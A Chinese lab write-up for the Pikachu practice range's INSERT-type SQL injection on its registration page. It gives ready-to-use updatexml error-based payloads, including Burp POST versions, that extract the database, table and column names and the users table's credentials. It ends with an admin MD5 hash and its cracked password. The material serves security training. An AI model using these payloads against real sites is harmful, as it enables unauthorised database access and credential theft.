# Pikachu 靶场 insert 注入（sqli_reg.php 注册页面）

> 
> 这是**INSERT 插入型 SQL 注入**，后台执行`INSERT INTO ... VALUES(...)`注册插入语句，页面没有正常数据回显，使用 **updatexml 报错注入**，把查询结果放在数据库报错信息里弹出来。

> 
> ⚠️安全提示：该内容仅限本地靶场学习，禁止对非授权网站测试。

## 步骤 1：判断注入点

在【用户】输入框输入单引号：`'`，其他随便填，提交注册。
页面出现 MySQL 语法报错，证明用户名存在单引号字符型注入点CSDN博...。

后台原始 SQL 大概：

```
INSERT INTO member(username,pw,sex,phonenum,email,address) VALUES ('$username','$pw','$sex','$phonenum','$email','$address');
```

## 步骤 2：爆当前数据库名

**用户框填入 payload**，其他输入框随便填内容（密码随便写 123，性别手机地址随便写）：

```
a' or updatexml(1,concat(0x7e,database()),1) or '
```

提交注册，报错里拿到库名：`pikachu`。

Payload 解析：

- `a'`：闭合前面的单引号
- `or updatexml(1,concat(0x7e,database()),1)`：updatexml 报错函数，`0x7e`是波浪号`~`，把查询结果放进报错
- `or '`：闭合后面剩余单引号，保证语法不出错

## 步骤 3：爆表名

用户输入：

```
a' or updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema='pikachu')),1) or '
```

得到表，重点关注`users`表（存放账号密码）。

> 
> updatexml 报错最多显示 32 字符，如果显示不全，用`right(查询语句,31)`截取后半部分继续查。

## 步骤 4：爆 users 表的列名

```
a' or updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema='pikachu' and table_name='users')),1) or '
```

拿到字段：`id,username,password,level`。

## 步骤 5：读取账号密码数据

```
a' or updatexml(1,concat(0x7e,(select group_concat(username,0x3a,password) from pikachu.users)),1) or '
```

- `0x3a`是冒号`:`，用来分隔账号和 md5 密码。

> 
> updatexml 有长度限制，只能看到一部分，可以多次用`substr()`截取字符串拿到完整 md5，再解密得到明文密码`123456`（admin 账号）。

## 抓包版本（Burp Suite）

表单 POST 参数：

```
POST /vul/sqli/sqli_iu/sqli_reg.php HTTP/1.1
Content‑Type: application/x‑www‑form‑urlencoded

username=a' or updatexml(1,concat(0x7e,database()),1) or '&pw=123&sex=1&phonenum=1&email=1&address=1&submit=submit
```

把上面 payload 放到`username`参数，发送，看响应体的 MySQL 报错信息拿数据。



# ==============
具体解法如下:
# Pikachu‑sqli_iu（insert 注入）全套 Payload 集合

> 
> 使用位置：**用户名 (username) 输入框**，其余表单随便填写；靶场字段一共 6 列：`username,pw,sex,phonenum,email,address`
> 注入核心格式：`a',1,报错函数,1,1,1)#`

## 1. 获取当前数据库名

```
a',1,updatexml(1,concat(0x7e,database()),1),1,1,1)#
```

结果：`pikachu`

## 2. 查询所有数据表

```
a',1,updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema='pikachu')),1),1,1,1)#
```

结果：`httpinfo,member,message,users,xssblind`

## 3. 查询 users 表字段名

```
a',1,updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema='pikachu' and table_name='users')),1),1,1,1)#
```

结果：`id,username,password,level`

## 4. 读取账号密码（分段绕过 32 字符截断）

### 第一段：1‑30 位

```
a',1,updatexml(1,concat(0x7e,substr((select group_concat(username,0x3a,password) from pikachu.users),1,30)),1),1,1,1)#
```

### 第二段：31 位往后剩余内容

```
a',1,updatexml(1,concat(0x7e,substr((select group_concat(username,0x3a,password) from pikachu.users),31)),1),1,1,1)#
```

### 第三段（可选，获取 pikachu 用户完整密码）

```
a',1,updatexml(1,concat(0x7e,substr((select group_concat(username,0x3a,password) from pikachu.users),52)),1),1,1,1)#
```

# Burp 抓包 URL 编码版本（# → %23）

```
username=a',1,updatexml(1,concat(0x7e,database()),1),1,1,1)%23&pw=123&sex=1&phonenum=1&email=1&address=1&submit=submit
```

# 最终拿到的数据

```
admin:e10adc3949ba59abbe56e057f20f883e
```

MD5 解密：`123456`